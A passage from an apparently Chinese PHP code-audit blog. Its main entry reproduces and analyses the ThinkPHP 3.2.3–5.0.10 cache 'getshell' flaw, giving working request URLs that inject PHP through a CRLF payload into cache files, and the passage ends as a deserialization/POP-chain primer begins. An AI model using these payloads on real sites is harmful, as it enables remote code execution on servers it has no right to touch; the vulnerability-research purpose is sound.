function">parseKey</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token variable">$field</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token variable">$fieldsStr</span> <span class="token operator">=</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$fieldsStr</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.t00ls.cc/thread-64917-1-1.html">某小说cms某处sql注入漏洞</a></p>]]></content>
      
      
      <categories>
          
          <category> PHP代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> php </tag>
            
            <tag> ThinkPHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计—ThinkPHP5.0.10-3.2.3缓存Getshell</title>
      <link href="posts/8016.html"/>
      <url>posts/8016.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>thinkphp缓存漏洞的触发点以及生成的缓存文件的文件名 一般需要结合代码 审计来找到，<br>因为使用<code>S()</code> 或者 <code>Cache()</code> 函数的位置不确定，调用函数的传参变量也不确定</p><h1 id="thinkphp3-2-3"><a href="#thinkphp3-2-3" class="headerlink" title="thinkphp3.2.3"></a>thinkphp3.2.3</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>控制器添加test方法，如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;style type="text/css"&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: "微软雅黑"; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}&lt;/style&gt;&lt;div style="padding: 24px 48px;"&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V{$Think.version}&lt;/div&gt;&lt;script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"&gt;&lt;/script&gt;&lt;thinkad id="ad_55e75dfae343f5a1"&gt;&lt;/thinkad&gt;&lt;script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"&gt;&lt;/script&gt;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">S</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cache'</span><span class="token punctuation">,</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>浏览器访问</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">http</span><span class="token punctuation">:</span><span class="token comment">//192.168.1.8/index.php?s=/Home/index/test&amp;x=test</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在<code>Application/Runtime/Temp/</code>文件夹下成功生成了php文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//000000000000s:4:"test";</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>传参内容被注释掉了，参数未过滤<code>%0d%0a</code></p><p>可以以此来绕过行注释，访问</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">http</span><span class="token punctuation">:</span><span class="token comment">//192.168.1.8/index.php?s=/Home/index/test&amp;x=%0d%0aphpinfo();//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功绕过注释,生成文件 <code>0fea6a13c52b4d4725368f24b045ca84.php</code>,<br>因为调用缓存函数时传参是  <code>S('cache',I('x'));</code><br>所以生成的缓存文件名是 md5(cache).php</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php//000000000000s:16:"phpinfo();//";?&gt;url:http://192.168.1.8/Application/Runtime/Temp/0fea6a13c52b4d4725368f24b045ca84.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先跟进<code>S</code> 方法，经过一系列判断调用了 <code>set</code> 方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">S</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$options</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token variable">$cache</span>   <span class="token operator">=</span>   <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">// 缓存操作的同时初始化</span>        <span class="token variable">$type</span>       <span class="token operator">=</span>   <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token variable">$cache</span>      <span class="token operator">=</span>   <span class="token class-name class-name-fully-qualified static-context">Think<span class="token punctuation">\</span>Cache</span><span class="token operator">::</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 缓存初始化</span>        <span class="token variable">$type</span>       <span class="token operator">=</span>   <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$name</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token variable">$cache</span>      <span class="token operator">=</span>   <span class="token class-name class-name-fully-qualified static-context">Think<span class="token punctuation">\</span>Cache</span><span class="token operator">::</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$cache</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 自动初始化</span>        <span class="token variable">$cache</span>      <span class="token operator">=</span>   <span class="token class-name class-name-fully-qualified static-context">Think<span class="token punctuation">\</span>Cache</span><span class="token operator">::</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token operator">===</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">// 获取缓存</span>        <span class="token keyword">return</span> <span class="token variable">$cache</span><span class="token operator">-&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 删除缓存</span>        <span class="token keyword">return</span> <span class="token variable">$cache</span><span class="token operator">-&gt;</span><span class="token function">rm</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token comment">// 缓存数据</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$expire</span>     <span class="token operator">=</span>   <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'expire'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'expire'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$expire</span>     <span class="token operator">=</span>   <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$cache</span><span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后跟进到<code>/Library/Think/Cache/File.class.php</code>文件，可以看到</p><p><code>$data</code> 未经任何过滤，序列化过后，直接被写到文件内</p><p>序列化过后，payload被有双引号包裹，最后还有分号</p><pre class="line-numbers language-none"><code class="language-none">s:10:"phpinfo();";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后在前面拼接上注释符号，所以这里在payload前面使用 <code>%0d%0a</code> 回车换行绕过，</p><p>后面我们在payload后面添加注释符，注释掉序列化数据生成的<code>"</code>和<code>;</code></p><p>payload:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">http</span><span class="token punctuation">:</span><span class="token comment">//192.168.1.8/index.php?s=/Home/index/test&amp;x=%0d%0aphpinfo();//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">public function set($name,$value,$expire=null) {    N('cache_write',1);    if(is_null($expire)) {        $expire =  $this-&gt;options['expire'];    }    $filename   =   $this-&gt;filename($name);    $data   =   serialize($value);    if( C('DATA_CACHE_COMPRESS') &amp;&amp; function_exists('gzcompress')) {        //数据压缩        $data   =   gzcompress($data,3);    }    if(C('DATA_CACHE_CHECK')) {//开启数据校验        $check  =  md5($data);    }else {        $check  =  '';    }    $data    = "<span class="token php language-php"><span class="token delimiter important">&lt;?</span>php\n<span class="token comment">//".sprintf('%012d',$expire).$check.$data."\n</span><span class="token delimiter important">?&gt;</span></span>";    $result  =   file_put_contents($filename,$data);    if($result) {        if($this-&gt;options['length']&gt;0) {            // 记录缓存队列            $this-&gt;queue($name);        }        clearstatcache();        return true;    }else {        return false;    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟进<code>   $this-&gt;filename($name)</code>方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">filename</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$name</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'DATA_CACHE_KEY'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'DATA_CACHE_SUBDIR'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 使用子目录</span>        <span class="token variable">$dir</span>   <span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'DATA_PATH_LEVEL'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$dir</span><span class="token operator">.=</span><span class="token variable">$name</span><span class="token punctuation">{</span><span class="token variable">$i</span><span class="token punctuation">}</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'temp'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'temp'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$dir</span><span class="token punctuation">,</span><span class="token number">0755</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$dir</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'temp'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>文件名 由 调用缓存函数时传参<code>$name</code> 和 配置文件里面的参数<code>DATA_CACHE_KEY</code>、<code>DATA_CACHE_SUBDIR</code>、<code>DATA_CACHE_PREFIX</code></p><p>共同决定，但是配置文件里面这些参数一般默认为空</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">S</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cache'</span><span class="token punctuation">,</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 所以一般情况下文件名为 md5(cache).php</span><span class="token comment">// 0fea6a13c52b4d4725368f24b045ca84.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="thinkphp5-0-5"><a href="#thinkphp5-0-5" class="headerlink" title="thinkphp5.0.5"></a>thinkphp5.0.5</h1><p>原理类似，缓存文件的路径不一样</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getCacheKey</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cache_subdir'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">// 使用子目录</span>            <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token constant">DS</span> <span class="token operator">.</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token constant">DS</span> <span class="token operator">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token variable">$name</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.php'</span><span class="token punctuation">;</span>        <span class="token variable">$dir</span>      <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>缓存文件位置 b0 文件夹是 md5($name) 前 2 位。</p><p><a href="http://domain/runtime/cache/b0/b068931cc450442b63f5b3d276ea4297.php">http://domain/runtime/cache/b0/b068931cc450442b63f5b3d276ea4297.php</a></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/fly_hps/article/details/84952890">ThinkPHP3.2.3~5.0.10缓存函数设计缺陷可导致Getshell</a></p><p><a href="https://h3art3ars.github.io/2019/12/16/Thinkphp3-2-3-5-0-10%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/">Thinkphp3.2.3-5.0.10缓存漏洞 | h3art3ars</a></p><p><a href="https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-5.x-%E6%BC%8F%E6%B4%9E/Thinkphp-5.0.5-%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E.html">Thinkphp-5.0.5-缓存漏洞 - Thinkphp/Thinkphp-5.x-漏洞</a></p>]]></content>
      
      
      <categories>
          
          <category> PHP代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> php </tag>
            
            <tag> ThinkPHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计—ThinkPHP3.2.3反序列化</title>
      <link href="posts/35717.html"/>
      <url>posts/35717.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>所有 PHP 里面的值都可以使用 serialize() 函数将其转换为一个可以存储的字符串，也就是序列化。  </p><p>所谓序列化，就是将一个在内存中的变量转换为可保存或传输的字符串的过程。</p><p>序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。</p><p>另外，为了能够反序列化一个对象，这个对象的类必须已经定义过。</p><p>如果序列化类 A 的一个对象，将会返回一个跟类 A 相关，而且包含了对象所有变量值的字符串。</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>反序列化就是在适当的时候使用unserialize()函数把序列化字符串再转化成原来的变量使用。</p><p>这两个过程结合起来可以轻松的完成数据的存储和传输操作，使得程序更具维护性。</p><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>我们无法控制对象的方法来调用，因此我们这里只能去找一些可以自动调用的一些魔术方法</p><p>常用的一些魔术方法:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">__wakeup， <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 执行前调用__destruct， 对销毁的时候调用__toString， 类被当成字符串时的回应方法<span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，当对象创建<span class="token punctuation">(</span><span class="token keyword">new</span><span class="token punctuation">)</span>时会自动调用，注意在<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>时并不会自动调用<span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，<span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>时会先被调用<span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，在对象中调用一个不可访问方法时调用<span class="token function">__callStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，用静态方式中调用一个不可访问方法时调用<span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，获得一个类的成员变量时调用<span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，设置一个类的成员变量时调用<span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，当对不可访问属性调用<span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>或<span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span>时调用<span class="token function">__unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，当对不可访问属性调用<span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>时被调用。<span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，执行<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>时，先会调用这个函数<span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，类被当成字符串时的回应方法<span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，调用函数的方式调用一个对象时的回应方法<span class="token function">__set_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，调用<span class="token function">var_export</span><span class="token punctuation">(</span><span class="token punctuation">)</span>导出类时，此静态方法会被调用。<span class="token function">__clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，当对象复制完成时调用<span class="token function">__autoload</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，尝试加载未定义的类<span class="token function">__debugInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，打印所需调试信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h2><blockquote><p>面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。</p></blockquote><p>POP 链的构造是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。反序列化过程就是控制代码执行流程的方法之一，当然进行反序列化的数据需要能够被用户输入所控制。</p><h2 id="常见漏洞点"><a href="#常见漏洞点" class="headerlink" title="常见漏洞点"></a>常见漏洞点</h2><h3 id="反序列化的常见起点"><a href="#反序列化的常见起点" class="headerlink" title="反序列化的常见起点"></a>反序列化的常见起点</h3><ul><li>__wakeup 一定会调用</li><li>__destruct 一定会调用</li><li>__toString 当一个对象被反序列化后又被当做字符串使用</li></ul><h3 id="反序列化的常见终点"><a href="#反序列化的常见终点" class="headerlink" title="反序列化的常见终点"></a>反序列化的常见终点</h3><ul><li>__call 调用不可访问或不存在的方法时被调用</li><li>call_user_func 一般php代码执行都会选择这里</li><li>call_user_func_array 一般php代码执行都会选择这里</li></ul><h3 id="反序列化的常见中间跳板"><a href="#反序列化的常见中间跳板" class="headerlink" title="反序列化的常见中间跳板"></a>反序列化的常见中间跳板</h3><ul><li>__toString 当一个对象被当做字符串使用</li><li>__get 读取不可访问或不存在属性时被调用</li><li>__set 当给不可访问或不存在属性赋值时被调用</li><li>__isset 对不可访问或不存在的属性调用isset()或empty()时被调用</li></ul><h3 id="反序列化的常见终点-1"><a href="#反序列化的常见终点-1" class="headerlink" title="反序列化的常见终点:"></a>反序列化的常见终点:</h3><ul><li>__call 调用不可访问或不存在的方法时被调用</li><li>call_user_func 一般php代码执行都会选择这里</li><li>call_user_func_array 一般php代码执行都会选择这里</li></ul><h3 id="Phar反序列化原理以及特征"><a href="#Phar反序列化原理以及特征" class="headerlink" 